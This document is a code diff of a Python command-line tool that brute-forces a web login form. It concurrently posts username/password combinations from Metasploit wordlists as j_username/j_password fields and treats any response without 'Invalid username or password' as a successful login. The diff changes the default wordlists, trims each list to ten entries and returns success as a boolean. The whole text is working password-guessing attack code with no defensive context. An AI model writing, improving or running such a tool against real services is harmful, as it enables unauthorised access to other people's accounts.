@@ -13,7 +13,7 @@ from functools import wraps
 import logging
 import timeit
 import psutil
-import itertools
+from typing import Generator
 
 logger = logging.getLogger(logging.basicConfig(level=logging.INFO))
 
@@ -31,8 +31,8 @@ def coroutine(f):
 
 @click.command()
 @click.argument("url", type=str, required=True)
-@click.option("-u", "user_list", type=Path, default="/usr/share/wordlists/metasploit/password.lst")
-@click.option("-p", "password_list", type=Path, default=Path("/usr/share/wordlists/metasploit/password.lst"))
+@click.option("-u", "user_list", type=Path, default="/usr/share/wordlists/metasploit/common_roots.txt")
+@click.option("-p", "password_list", type=Path, default=Path("/usr/share/wordlists/metasploit/common_roots.txt"))
 @click.option("-t", "threads", type=int, default=8)
 @coroutine
 async def crack(url:str, user_list:Path, password_list:Path, threads:int):
@@ -43,6 +43,8 @@ async def crack(url:str, user_list:Path, password_list:Path, threads:int):
             for result in results:
                 if isinstance(result, Exception):
                     raise result
+                if result:
+                    sys.exit(0)
 
 def batched_tasks(genexpr, memory):
     probe_element = next(genexpr)
@@ -52,22 +54,20 @@ def batched_tasks(genexpr, memory):
     
 
 def permutations(user_list, password_list):
-    users = user_list.read_text("latin-1").splitlines()
-    users = list(filter(lambda user: not any(char in user for char in ["!","§","$","%","&","/","(",")","=","?",")"] + [str(num) for num in range(10)]), users))
-    passwords = password_list.read_text("latin-1").splitlines()
+    users = user_list.read_text("latin-1").splitlines()[0:10]
+    passwords = password_list.read_text("latin-1").splitlines()[0:10]
     for user in users:
         for password in passwords:
             yield {"j_username":user,"j_password": password, "Submit":"Sign+in"}
            
 
-async def post_and_check(url, data, session:ClientSession):
+async def post_and_check(url, data, session:ClientSession) -> bool:
     async with session.post(url, data=data) as response:
         result = await response.text()
-        if "Invalid username or password" in result:
-            print(f"Unsuccessful login for {data}", flush=True)
-        else:
-            print(f"Successful login for {data}", flush=True)
-            sys.exit(0)
+        if "Invalid username or password" not in result:
+            print(f"Successful login for {data}")
+            return True
+        return False
     
 
 if __name__ == "__main__":
